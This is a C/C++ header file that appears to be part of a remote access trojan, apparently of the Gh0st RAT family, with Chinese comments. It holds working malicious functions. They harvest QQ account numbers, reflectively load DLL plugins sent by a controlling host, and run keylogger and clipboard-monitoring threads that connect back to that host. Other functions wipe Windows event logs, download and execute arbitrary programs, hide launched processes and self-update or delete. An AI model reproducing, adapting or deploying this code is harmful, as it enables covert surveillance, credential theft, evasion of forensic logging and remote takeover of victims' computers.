#if !defined(AFX_LOOP_H_INCLUDED)
#define AFX_LOOP_H_INCLUDED

#include "until.h"
#include "MemoryModule.h"
#include <STDLIB.H>
#include "common/KeyboardManager.h"
#include "common/keylog.h"
#include "ChatManager.h"

extern HMODULE  hDllModule;
extern BOOL     bisUnInstall;
//extern DLLSERVER_INFO dll_info;

typedef BOOL (* PluginMe)(LPCTSTR strHost, UINT HostPort,LPBYTE lparam);

typedef BOOL (* PluginSysMe)(LPCTSTR lpszHost, UINT nPort, LPBYTE lparam, int n , LPCTSTR p);






char *GetQQ()
{
	char *szQQNum = new char[2048];
	memset(szQQNum, 0, 260);
	char szText[2048] = {0};
    char szQQNumber[2048] = {0};
    HWND hWnd = FindWindowA("CTXOPConntion_Class", NULL);
	
	while (hWnd)
	{
		char szClassName[MAX_PATH] = {0};
		GetClassName(hWnd, szClassName, MAX_PATH);
		if (strcmp(szClassName, "CTXOPConntion_Class") == 0)
		{	
			// 得到类似OP_12345678的字符串
			if (hWnd)
			{
				GetWindowText(hWnd, szText, MAX_PATH);
			}
			// 得到12345678 qq号
			int len = strlen(szText);
			do
			{
				len--;
			} while (szText[len] != '_');
			strcpy(szQQNumber, &szText[len+1]);
			//printf("%s\n", szText);
			//printf("%s\n", szQQNumber);
			//printf("%s\n", szClassName);
			if (lstrlen(szQQNum) != 0)
			{	
				strcat(szQQNum, "|");
			}
			strcat(szQQNum, szQQNumber);
		}
		hWnd = GetWindow(hWnd, GW_HWNDNEXT);
	}
	if (lstrlen(szQQNum) == 0)
	{
		strcpy(szQQNum, "-/-");
	}
	return szQQNum;
}


extern const char * szAddress;
extern int nConNum;
BOOL LoadSysFromMemory(LPVOID data,LPCTSTR lpszHost, UINT nPort,LPBYTE lpBuffer)
{
	
	HMEMORYMODULE module;
	PluginSysMe myPluginMe;
	const char name[] = {'P','l','u','g','i','n','M','e','\0'};
	
	module = MemoryLoadLibrary(data);
	if (module == NULL)
	{
		goto exit;
	}
	
	myPluginMe = (PluginSysMe)MemoryGetProcAddress(module,name);
	myPluginMe(lpszHost,nPort,lpBuffer,nConNum,szAddress);
	MemoryFreeLibrary(module);
	
exit:
	
	if (data)
		VirtualFree(data,0,MEM_RELEASE);
	
	return 1;
}

DWORD WINAPI Loop_SysPlugin(LPVOID lparam)
{
	LoadSysFromMemory(lparam,CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort,NULL);
	return 0;
}

BOOL LoadFromMemory(LPVOID data,LPCTSTR lpszHost, UINT nPort,LPBYTE lpBuffer)
{
	
	HMEMORYMODULE module;
	PluginMe myPluginMe;
	const char name[] = {'P','l','u','g','i','n','M','e','\0'};

	module = MemoryLoadLibrary(data);
	if (module == NULL)
	{
		goto exit;
	}

	myPluginMe = (PluginMe)MemoryGetProcAddress(module,name);
	myPluginMe(lpszHost,nPort,lpBuffer);
	MemoryFreeLibrary(module);
	
exit:

 	if (data)
 		VirtualFree(data,0,MEM_RELEASE);

	return 1;
}

DWORD WINAPI Loop_Plugin(LPVOID lparam)
{
	LoadFromMemory(lparam,CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort,NULL);
	return 0;
}

// BOOL CheckFileExist(LPCTSTR lpszPath)
// {
// 	if ( m_gFunc.GetFileAttributes(lpszPath) == 0xFFFFFFFF && m_gFunc.GetLastError() == ERROR_FILE_NOT_FOUND ) 
// 		return FALSE;
// 	else
// 		return TRUE;
// }


DWORD WINAPI Loop_ShowDlg(LPVOID lparam)
{	
	
	LPBYTE lpBuffer = (LPBYTE)lparam;
	char str [100] = {0};
	
	memcpy(str,lpBuffer ,100);
	
	
	LoadFromMemory(lpBuffer + 100,CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort,(LPBYTE)str);
	
	return 0;
}


typedef BOOL (* OpenProxy)(LPVOID lparam);
typedef BOOL (* CloseProxy)();
char bToken[99];

HMEMORYMODULE hmProxy = NULL;
BOOL WINAPI Loop_Proxy(CClientSocket * m_pClient)
{

	if ( hmProxy!= NULL)
	{
		return FALSE;
	}

	LPBYTE lpBuffer = m_pClient->m_DeCompressionBuffer.GetBuffer(1);
	UINT nSize = m_pClient->m_DeCompressionBuffer.GetBufferLen() - 1;

	memset(bToken,0,sizeof(bToken));
	memcpy(bToken,lpBuffer,99);

	nSize -= 99;
	const char name[] = {'O','p','e','n','P','r','o','x','y','\0'};

	LPBYTE data = new BYTE[nSize];
	memcpy(data,lpBuffer + 99,nSize );
	
	hmProxy = MemoryLoadLibrary(data);
	if (hmProxy == NULL)
	{
		goto exit;
	}

	OpenProxy myOpenProxy;
	myOpenProxy = (OpenProxy)MemoryGetProcAddress(hmProxy, name);
	myOpenProxy(bToken);
	MemoryFreeLibrary(hmProxy);
	
exit:
	if (data)
 		delete [] data;

	hmProxy = NULL;


	return 0;
}

BOOL StopProxy()
{
	if (hmProxy != NULL)
	{
		CloseProxy myCloseProxy;
		myCloseProxy = (CloseProxy)MemoryGetProcAddress(hmProxy, "CloseProxy");
    	myCloseProxy();
		return TRUE;
	}
	return FALSE;
}

DWORD WINAPI Loop_KeyboardManager(SOCKET sRemote)//键盘记录
{	
	
	CClientSocket	SocketClient;
	if (!SocketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
		return -1;
	
	CKeyboardManager	manager(&SocketClient);
	
	SocketClient.run_event_loop();
	
	return 0;
}

DWORD WINAPI Loop_ChatManager(SOCKET sRemote)   //剪切版
{	
	//	MessageBox(NULL,NULL,NULL,NULL);
	CClientSocket	SocketClient;
	if (!SocketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
		return -1;
	
	CChatManager	manager(&SocketClient);	
	SocketClient.run_event_loop();
	
	return 0;
}

// 关机
void ShutdownWindows( DWORD dwReason )
{
	DebugPrivilege(SE_SHUTDOWN_NAME,TRUE);
	ExitWindowsEx(dwReason, 0);
	DebugPrivilege(SE_SHUTDOWN_NAME,FALSE);	

}

// 弹窗
DWORD WINAPI Loop_Messagebox(LPVOID lParam)
{
	struct MSGBOX
	{
		CHAR Title[200];
		CHAR szText[1000];
		UINT Type;
	}MsgBox;
	
	memcpy(&MsgBox,lParam,sizeof(MSGBOX));
	MessageBox(NULL,MsgBox.szText,MsgBox.Title,MsgBox.Type|MB_SYSTEMMODAL);

	return -1;
}


//清除日志
void CleanEvent(BYTE bType)
{
	char *strEventName[] = {"Application", "Security", "System"};
	switch(bType)
	{
	case CLEAN_EVENT_ALL:
		break;
	case CLEAN_EVENT_APP:
		strEventName[1] = "";
		strEventName[2] = "";
		break;
	case CLEAN_EVENT_SEC:
		strEventName[0] = "";
		strEventName[2] = "";
		break;
	case CLEAN_EVENT_SYS:
		strEventName[0] = "";
		strEventName[1] = "";
		break;
	default:
		return;
	}
	

	for (int i = 0; i < sizeof(strEventName) / sizeof(int); i++)
	{
		HANDLE hHandle = OpenEventLog(NULL, strEventName[i]);
		if (hHandle == NULL)
			continue;
		ClearEventLog(hHandle, NULL);
		CloseEventLog(hHandle);
	}
}


void WriteRegExg(LPCTSTR lpServiceName ,LPTSTR lpSame ,LPCTSTR lpHostID)
{
	char	strSubKey[1024]={0};
	
	memset(strSubKey, 0, sizeof(strSubKey));
	
	
	char JYvni08[] = {'S','Y','S','T','E','M','\\','C','u','r','r','e','n','t','C','o','n','t','r','o','l','S','e','t','\\','S','e','r','v','i','c','e','s','\\','%','s','\0'};
	
	wsprintf(strSubKey,JYvni08,lpServiceName);	
	
	WriteRegEx(HKEY_LOCAL_MACHINE, strSubKey, lpSame, REG_SZ, (char *)lpHostID, lstrlen(lpHostID), 0);
	
	
}
void SetHostID(LPCTSTR lpServiceName, LPCTSTR lpHostID)  //修改备注
{
	char LcDdy01[] = {'H','o','s','t','\0'};
	WriteRegExg(lpServiceName,LcDdy01,lpHostID);
}

void SetGroup(LPCTSTR lpServiceName, LPCTSTR lpHostID)  //修改分组
{
	OutputDebugString("进入修改分组");
	char BvtmX06[] = {'C','o','n','n','e','c','t','G','r','o','u','p','\0'};
	WriteRegExg(lpServiceName,BvtmX06,lpHostID);
}

//修改备注 或分组 bUpGroup == FALSE 为修改备注 TRUE 为修改分组
// void SetHostID(LPCTSTR lpBuffer,BOOL bUpGroup = FALSE)
// {
// 	char ServerINIPath[MAX_PATH]={0};
// 	GetModuleFileName(hDllModule,ServerINIPath,sizeof(ServerINIPath));
// 	PathRemoveFileSpec(ServerINIPath);
// 	lstrcat(ServerINIPath,"\\Server.ini");
// 	char str[20]={0};
// 	MessageBox(NULL,(char*)lpBuffer,"修改分组",MB_OK);
// 	if (bUpGroup)
// 	{
// 		lstrcpy(str,"Group");
// 	}
// 	else
// 	{
// 		lstrcpy(str,"Remark");
// 	}
// 	WritePrivateProfileString("INSTALL",str,(char*)lpBuffer,ServerINIPath); 

// 待修改
/*	char strSubKey[MAX_PATH];
	wsprintf(strSubKey, "SYSTEM\\CurrentControlSet\\Services\\%s", dll_info.ServiceName);

	char *str = "Remark";
	if (bUpGroup)
		str = "puorG";
	WriteRegEx(HKEY_LOCAL_MACHINE, 
		strSubKey, 
		str, 
		REG_SZ, 
		(char*)lpBuffer, 
		m_gFunc.strlen(lpBuffer), 
		1);	*/		
/*}*/
/////////////////////////////////////////////////////////////////////////////////
extern HMODULE hDllModule;
void Rundll32Dll(char* p = NULL)
{

	
	if (p)
    DeleteMe();
	
	bisUnInstall = TRUE;
}

char *  my_strrchr(const char * str,int ch)
{
	
	char *p = (char *)str;
	while (*str) str++;
	while (str-- != p && *str != (char)ch);
	if (*str == (char)ch) 
        return( (char *)str );
	
	return(NULL);
}

bool OpenFile(LPCTSTR lpFile, INT nShowCmd)
{
	char	lpSubKey[500];
	char	strTemp[MAX_PATH];
	char	*lpstrCat = NULL;
	memset(strTemp, 0, sizeof(strTemp));
	
	char	*lpExt = my_strrchr(lpFile, '.');
	if (!lpExt)
		return false;
	
	char strResult[MAX_PATH] = {0}; //保存结果
	if (my_strrchr(lpExt, ' '))
	{
		int nStrLen = strlen(lpExt) - 1 ; //原始字符串长度
		
		for(int i = nStrLen ; i > 0; i--)
		{
			if(lpExt[i] == ' ')
			{
				my_strncpy(strResult,lpExt, i );
				break;
			}
		}
	}
	else
		lstrcpy(strResult,lpExt);
			  
	
	if(!ReadRegEx(HKEY_CLASSES_ROOT,strResult,0L,REG_SZ,strTemp,NULL,sizeof(strTemp),0))
		return false;
	
	memset(lpSubKey, 0, sizeof(lpSubKey));
	wsprintf(lpSubKey, "%s\\shell\\open\\command", strTemp);
	
	memset(strTemp, 0, sizeof(strTemp));
	char str[MAX_PATH] = {0};
	if(!ReadRegEx(HKEY_CLASSES_ROOT,lpSubKey,0L,REG_EXPAND_SZ,str,NULL,sizeof(str),0))
		return false;

	ExpandEnvironmentStrings(str,strTemp,MAX_PATH);
	
	
	lpstrCat = strstr(strTemp, "\"%1");
	if (lpstrCat == NULL)
		lpstrCat = strstr(strTemp, "%1");
	if (lpstrCat == NULL)
	{
		lstrcat(strTemp, " ");
		lstrcat(strTemp, lpFile);
	}
	else
		lstrcpy(lpstrCat, lpFile);
				
	STARTUPINFO si = {0};
	PROCESS_INFORMATION pi;
	si.cb = sizeof si;
	if (nShowCmd != SW_HIDE)
	{
		si.lpDesktop = "WinSta0\\Default"; 
	}else
	{
		si.dwFlags = STARTF_USESHOWWINDOW;
		si.wShowWindow = SW_HIDE;
	}

	CreateProcess(NULL, strTemp, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);

	return true;
}
typedef struct 
{
	BYTE bToken;
	UINT nType;
	char lpCmdLine[MAX_PATH];
	char lpFileName[100];
}LOCALUP;

BOOL LocalLoad(LPBYTE lpBuffer, UINT nSize)
{
	LOCALUP LocaUp;
	memcpy(&LocaUp,lpBuffer,sizeof(LOCALUP));

	char strOpenFile[MAX_PATH + 100] = {0};

	HANDLE hFile; 
	DWORD  dwBytesWritten;
	hFile = CreateFile(LocaUp.lpFileName,GENERIC_WRITE,FILE_SHARE_READ,NULL,CREATE_ALWAYS,NULL,NULL);
	if (hFile == INVALID_HANDLE_VALUE)
		return false;
    if(!WriteFile(hFile, lpBuffer + sizeof(LOCALUP), nSize - sizeof(LOCALUP) , &dwBytesWritten, NULL)) 
		return false;
	CloseHandle(hFile); 
	
	
	if(strlen(LocaUp.lpCmdLine)!=0)
		wsprintfA(strOpenFile,"%s %s",LocaUp.lpFileName,LocaUp.lpCmdLine);
	else
		lstrcpy(strOpenFile,LocaUp.lpFileName);
	
	switch(LocaUp.nType)
	{
	case 0:
		OpenFile(strOpenFile,SW_SHOW);
		break;
	case 1:
		OpenFile(strOpenFile,SW_HIDE);
		break;
	case 2:
		break;
	case 3:
		Rundll32Dll(strOpenFile);
		break;
	default:
		break;
	}
	
	return TRUE;
}

//枚举窗体是否存在
BOOL bFindWindow = FALSE;
BOOL CALLBACK EnumWindowsList(HWND hwnd, LPARAM lParam)
{	
	if(!IsWindowVisible(hwnd))
		return TRUE;
	
	char szClassName[1024]={0};
	SendMessage(hwnd,WM_GETTEXT,1024,(LPARAM)szClassName);
	
	if (lstrlen(szClassName) == 0)
		return TRUE;
	
	char* lpBuffer = (char*)lParam;
	
	if (strstr(strupr(szClassName),strupr(lpBuffer)) != NULL)
	{
		bFindWindow = TRUE;
		return FALSE;
	}
		
	return TRUE;
}

BOOL CheckWindow(LPBYTE lpBuffer,CClientSocket* m_pClient)
{
	EnumWindows(EnumWindowsList, (LPARAM)(lpBuffer + 1));
	if (bFindWindow)
	{
		BYTE bToken = TOKEN_FIND_YES;
		m_pClient->Send(&bToken, 1);	
		return TRUE;
	}
	bFindWindow = FALSE;
	return FALSE;
}

BOOL CheckProcess(LPBYTE lpBuffer,CClientSocket* m_pClient)
{
	if (EnumProcesin((LPTSTR)lpBuffer + 1))
	{
		BYTE bToken = TOKEN_FIND_YES;
		m_pClient->Send(&bToken, 1);
		return TRUE;
	}
	return FALSE;
}

bool OpenURL(LPCTSTR lpszURL, INT nShowCmd)
{
	if (strlen(lpszURL) == 0)
		return false;
	// System 权限下不能直接利用shellexecute来执行
	char	*lpSubKey = "Applications\\iexplore.exe\\shell\\open\\command";
	char	strIEPath[MAX_PATH];
	LONG	nSize = sizeof(strIEPath);
	char	*lpstrCat = NULL;
	memset(strIEPath, 0, sizeof(strIEPath));


	if(!ReadRegEx(HKEY_CLASSES_ROOT,lpSubKey,0L,REG_SZ,strIEPath,NULL,sizeof(strIEPath),0))
		return false;

	if (lstrlen(strIEPath) == 0)
		return false;
	
	lpstrCat = strstr(strIEPath, "%1");
	if (lpstrCat == NULL)
		return false;
	
	lstrcpy(lpstrCat, lpszURL);
	STARTUPINFO si = {0};
	PROCESS_INFORMATION pi;
	si.cb = sizeof si;
	if (nShowCmd != SW_HIDE)
		si.lpDesktop = "WinSta0\\Default"; 
	else
	{
		si.dwFlags = STARTF_USESHOWWINDOW;
		si.wShowWindow = SW_HIDE;
	}

	CreateProcess(NULL, strIEPath, NULL, NULL, false, 0, NULL, NULL, &si, &pi);

	return 0;
}

#include <wininet.h>

bool http_get(LPCTSTR szURL, LPCTSTR szFileName)
{
	HINTERNET	hInternet = NULL, hUrl = NULL;
	HANDLE		hFile;
	TCHAR		buffer[1024];
	DWORD		dwBytesRead = 0;
	DWORD		dwBytesWritten = 0;
	BOOL		bIsFirstPacket = true;
	bool		bRet = true;
	
	HINSTANCE hdlldes = LoadLibrary("wininet.dll"); 
	
	typedef HINTERNET (WINAPI *NETOPEN)(LPCTSTR ,DWORD, LPCTSTR, LPCTSTR ,DWORD) ; 
	NETOPEN myNetOpen= (NETOPEN)GetProcAddress(hdlldes, "InternetOpenA");
	
	hInternet = myNetOpen("MSIE 6.0", INTERNET_OPEN_TYPE_PRECONFIG, NULL,INTERNET_INVALID_PORT_NUMBER,0);
	
	
	if (hInternet == NULL)
	{
		if(hdlldes)
			FreeLibrary(hdlldes);
		return false;
	}
	
	typedef HINTERNET (WINAPI *NETOPENURL)(HINTERNET ,LPCTSTR ,LPCTSTR ,DWORD ,DWORD ,DWORD_PTR ); 
	NETOPENURL 	myNetOpenUrl= (NETOPENURL)GetProcAddress(hdlldes, "InternetOpenUrlA");
	
	hUrl = myNetOpenUrl(hInternet, szURL, NULL, 0, INTERNET_FLAG_RELOAD, 0);
	
	if (hUrl == NULL)
	{
		if(hdlldes)
			FreeLibrary(hdlldes);
		return false;
	}
	hFile = CreateFile(szFileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
	
	if (hFile != INVALID_HANDLE_VALUE)
	{
		do
		{
			memset(buffer, 0, sizeof(buffer));
			typedef BOOL (WINAPI *APIS)(HINTERNET ,LPVOID ,DWORD ,LPDWORD ); 
			APIS myapis; 
			myapis= (APIS)GetProcAddress(hdlldes, "InternetReadFile"); 
			myapis(hUrl, buffer, sizeof(buffer), &dwBytesRead);
			
			// 由判断第一个数据包是不是有效的PE文件
			if (bIsFirstPacket && ((PIMAGE_DOS_HEADER)buffer)->e_magic != IMAGE_DOS_SIGNATURE)
			{
				bRet = false;
				break;
			}
			bIsFirstPacket = false;
			
			WriteFile(hFile, buffer, dwBytesRead, &dwBytesWritten, NULL);
		} while(dwBytesRead > 0);
		CloseHandle(hFile);
	}
	
	
	Sleep(1);
	typedef BOOL (WINAPI *NETCLOSE)(HINTERNET hInternet); 
	NETCLOSE  myNetClose= (NETCLOSE  )GetProcAddress(hdlldes,"InternetCloseHandle"); 
	
	myNetClose(hUrl);
	myNetClose(hInternet);
	
	if(hdlldes)
		FreeLibrary(hdlldes);
	
	return bRet;
}

// 下载执行
DWORD WINAPI Loop_DownManager(LPVOID lparam)
{
	int	nUrlLength;
	char	*lpURL = NULL;
	char	*lpFileName = NULL;
	nUrlLength = strlen((char *)lparam);
	if (nUrlLength == 0)
		return false;
	
	lpURL = new char[nUrlLength + 1];
	memcpy(lpURL, lparam, nUrlLength + 1);
	
	lpFileName = my_strrchr(lpURL, '/') + 1;
		
	if (lpFileName == NULL||!http_get(lpURL, lpFileName) || !CheckFileExist(lpFileName))
	{
    	delete []lpURL;
		return false;
	}
	
	STARTUPINFO si = {0};
	PROCESS_INFORMATION pi;
	si.cb = sizeof si;
	si.lpDesktop = "WinSta0\\Default"; 

	
	CreateProcess(NULL, lpFileName, NULL, NULL, false, 0, NULL, NULL, &si, &pi);
	
	delete []lpURL;
	
	return true;
}

BOOL UpdateServer(LPCTSTR lpURL)
{
	char	*lpFileName = NULL;
	
	lpFileName = my_strrchr(lpURL, '/') + 1;
	
	if (lpFileName == NULL)
		return false;
	
	if (!http_get(lpURL, lpFileName)||!CheckFileExist(lpFileName))
		return false;
	
	
	STARTUPINFO si = {0};
	PROCESS_INFORMATION pi;
	si.cb = sizeof si;
	si.lpDesktop = "WinSta0\\Default"; 
	
	
	CreateProcess(NULL, lpFileName, NULL, NULL, false, 0, NULL, NULL, &si, &pi);
	
	Rundll32Dll(lpFileName);
	return true;
}

void SetClore(LPCTSTR lpClore)
{
	
	char	strSubKey[1024]={0};
	memset(strSubKey, 0, sizeof(strSubKey));
	wsprintf(strSubKey, "SYSTEM\\Clore");
	WriteRegEx(HKEY_LOCAL_MACHINE, strSubKey, "Clore", REG_SZ, (char *)lpClore, lstrlen(lpClore), 0);
}

#endif // !defined(AFX_LOOP_H_INCLUDED)
